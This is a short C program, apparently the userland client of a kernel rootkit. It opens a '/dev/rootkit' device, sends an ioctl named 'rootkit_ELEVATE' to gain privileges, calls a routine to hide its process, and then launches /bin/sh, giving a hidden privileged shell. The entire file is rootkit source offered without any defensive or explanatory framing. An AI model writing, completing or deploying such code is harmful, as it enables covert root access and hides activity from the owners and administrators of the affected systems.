#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <string.h>

#include "../kernel/interface.h"

int main(void) {
	int fd;

	fd = open("/dev/rootkit", O_RDWR);

	 if (fd == -1) {
        perror("open");
        return -1;
    }

    if (ioctl(fd, rootkit_ELEVATE) == -1) {
        perror("ioctl");
        close(fd);
        return -1;
    }
    hide_process_syscall();
    close(fd);

    execl("/bin/sh", "sh", NULL);
    perror("execl /bin/sh");

	return 0;
}